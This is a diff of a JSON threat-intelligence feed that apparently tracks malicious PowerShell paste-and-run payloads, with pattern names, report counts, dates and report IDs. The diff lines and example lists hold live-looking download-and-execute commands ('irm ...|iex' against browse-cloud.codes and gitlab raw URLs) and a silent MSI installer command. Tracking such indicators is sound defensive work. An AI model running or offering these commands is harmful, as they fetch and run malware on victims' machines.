@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 152,
-    "ReportCount": 152,
-    "FirstSeen": "2026-11-13T01:55:24.301000+00:00",
+    "DistinctPayloadCount": 151,
+    "ReportCount": 151,
+    "FirstSeen": "2026-11-13T05:20:26.050000+00:00",
     "LastSeen": "2026-11-19T23:26:13.464000+00:00",
     "ReportIds": [
-      "cmwebrdpf0c2l0omlh3h75cni",
       "cmwej31qk0cf00omlfkkf1xkc",
       "cmwexrbu80epn0omlnpgz1hnh",
       "cmwey02zr0eyu0omlwwzxamhx",
@@ -250,7 +249,6 @@
       "irm 'browse-cloud.codes/a8c0c6760a752b5e'|iex;",
       "irm 'browse-cloud.codes/aa14feca329c84db'|iex;",
       "irm 'browse-cloud.codes/aa38ccc1a99c84b8'|iex;",
-      "irm 'browse-cloud.codes/aa57ea23162442f3'|iex;",
       "irm 'browse-cloud.codes/ab04965325b47811'|iex;",
       "irm 'browse-cloud.codes/ab3e1159cf4003f0'|iex;",
       "irm 'browse-cloud.codes/ae1dab8b6cf00daf'|iex;",
@@ -676,9 +674,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 8,
-    "ReportCount": 64,
+    "ReportCount": 65,
     "FirstSeen": "2026-11-13T05:58:18.016000+00:00",
-    "LastSeen": "2026-11-20T01:27:50.628000+00:00",
+    "LastSeen": "2026-11-20T01:59:17.278000+00:00",
     "ReportIds": [
       "cmwekfqsd0ciq0omld5n99u1h",
       "cmwexnoie0eja0omldix6i9jb",
@@ -743,7 +741,8 @@
       "cmwnt6b7q1xan0omlwi7e71xm",
       "cmwnxm1t71xj30oml4e26u03q",
       "cmwoarw6c1ytk0omlfgbkqvw7",
-      "cmwoauwbm1yu70oml45lo3jkx"
+      "cmwoauwbm1yu70oml45lo3jkx",
+      "cmwobzc2a1yzx0oml26ze35ud"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -830,11 +829,10 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 12,
-    "FirstSeen": "2026-11-13T01:45:15.056000+00:00",
+    "ReportCount": 11,
+    "FirstSeen": "2026-11-13T06:21:36.065000+00:00",
     "LastSeen": "2026-11-17T20:46:15.496000+00:00",
     "ReportIds": [
-      "cmwebebjc0c1o0oml57p74iht",
       "cmwel9plu0czo0omlez5ttanw",
       "cmwezgr170fas0omlma6arc0q",
       "cmwf2w2a00fkl0oml1ac8kcxp",
